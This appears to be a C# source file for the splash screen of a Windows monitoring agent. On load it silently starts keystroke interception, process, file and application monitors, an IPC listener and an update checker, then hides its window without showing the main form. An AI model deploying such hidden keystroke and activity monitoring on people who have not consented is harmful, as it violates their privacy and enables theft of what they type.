using MySqlConnector;
using System.Diagnostics;
using NativeSupportServiceApplication.Modules;
using NativeSupportServiceApplication.Models;
using NativeSupportServiceApplication.Utils;
using NativeSupportServiceApplication.Threads;
using System.ComponentModel;

namespace NativeSupportServiceApplication
{
    public partial class LoadingSplash : Form
    {

        Task loading;
        public LoadingSplash()
        {
            InitializeComponent();



        }

        private static void startServices()
        {

            Cache.rebuildRuleCache();
            GlobalConstants.taskAppMonitor = Task.Run(() => ApplicationMonitor.startMonitor());
            GlobalConstants.taskKeyMonitor = Task.Run(() => InterceptKeys.startMonitor());
          //  GlobalConstants.taskClipboardMonitor = Task.Run(() => ClipboardMonitor.startMonitor());
            GlobalConstants.taskProcessMonitor = Task.Run(() => ProcessMonitor.startMonitor());
            GlobalConstants.taskFileMonitor = Task.Run(() => FileMonitor.startMonitor());
            GlobalConstants.iPC = Task.Run(() => Icom.startListner());
            GlobalConstants.updateChecker = Task.Run(() => UpdateChecker.startMonitor());

        }

      

        private void button1_Click(object sender, EventArgs e)
        {
            Console.WriteLine("sfas");
        }

        Form currentForm ;

        private void LoadingSplash_Load(object sender, EventArgs e)
        {




            loading = Task.Run(() => {
                startServices();
            });

            currentForm = this;
            Debug.WriteLine("staring work");
            
            backgroundWorker1.RunWorkerAsync();




        }
        private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
        {
            Debug.WriteLine("sleeping");
           // Thread.Sleep(5000);
            Debug.WriteLine("awake");
            Debug.WriteLine("closing form");
            loading.Wait();
            //backgroundWorker1.ReportProgress(0,"done");
        }
        private void backgroundWorker1_ProgressChanged(object sender, ProgressChangedEventArgs e) 
        {
           
        }

        private void backgroundWorker1_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
        {
            currentForm.Hide();
            var main = new MainApplicationForm();
            main.Closed += (s, args) => currentForm.Close();
           // main.Show();
        }


       
    }
}

